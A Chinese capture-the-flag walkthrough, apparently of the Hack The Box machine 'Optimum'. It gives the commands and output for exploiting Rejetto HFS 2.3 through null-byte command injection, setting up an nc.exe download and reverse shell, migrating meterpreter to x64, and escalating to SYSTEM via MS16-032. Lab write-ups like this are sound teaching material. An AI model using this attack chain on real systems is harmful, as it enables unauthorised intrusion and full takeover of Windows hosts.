Phase 0

信息收集

$ nmap -sC -sV -p- --min-rate 10000 10.129.44.44
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3

只有一个 80 端口，运行 Rejetto HttpFileServer 2.3。

Phase 1

立足点：HFS 空字节注入 RCE

🧒 儿童版 — 搜索框塞空字节这个文件服务器有一个搜索框。如果你在搜索内容前面塞一个"隐形字符"（空字节 %00），后面跟上系统命令 {.exec|命令.}，服务器就会把你的命令当成内部指令执行。

Metasploit

msf6> use exploit/windows/http/rejetto_hfs_exec
msf6> set RHOSTS 10.129.44.44
msf6> set LHOST <攻击机IP>
msf6> exploit
meterpreter > getuid
Server username: OPTIMUM\kostas

手动方法

$ searchsploit -m windows/remote/39161.py
# 修改 ip_addr 和 local_port，准备 nc.exe
$ python3 -m http.server 80
$ nc -nlvp 443
$ python3 39161.py 10.129.44.44 80
# 可能需要多次运行
Phase 2

权限提升：MS16-032

迁移到 x64 进程（必须！）

meterpreter > sysinfo
Architecture : x64
Meterpreter  : x86/windows  ← 需要迁移

meterpreter > ps
# 找一个 x64 进程的 PID（如 explorer.exe）
meterpreter > migrate 1860
Meterpreter : x64/windows  ← 迁移成功
🧒 儿童版 — 小钥匙变大钥匙拿到的是 32 位的小钥匙，但保险箱的锁孔是 64 位的大锁。必须先 migrate 到一个 x64 进程"变形"成大钥匙，才能继续开锁。

MS16-032 Secondary Logon 提权

漏洞原理Windows Secondary Logon 服务在创建新进程时没有正确清理标准句柄。攻击者通过竞态条件劫持这些句柄，在 SYSTEM 权限的进程上下文中执行任意代码。
meterpreter > background
msf6> use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf6> set SESSION 1
msf6> set LHOST <攻击机IP>
msf6> exploit

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
踩坑提醒必须先 migrate 到 x64 进程，否则 MS16-032 会因架构不匹配失败。MS16-032 要求目标有 2 个以上 CPU 核心（HTB 满足）。
附录

知识点总结

HFS 2.3 CVE-2014-6287。

搜索参数中注入 %00{.exec|命令.}。HFS 的模板脚本语言 {.命令.} 类似 SSTI。

x86 → x64 迁移是 Windows 提权的前置条件。

很多内核提权模块需要 64 位 Native API。用 migrate 到 explorer.exe 或 svchost.exe。

MS16-032 Secondary Logon 句柄泄露。

竞态条件劫持 SYSTEM 句柄。需要 2+ CPU 核心。

HFS 2.3 空字节注入→migrate x64 → MS16-032 → SYSTEM
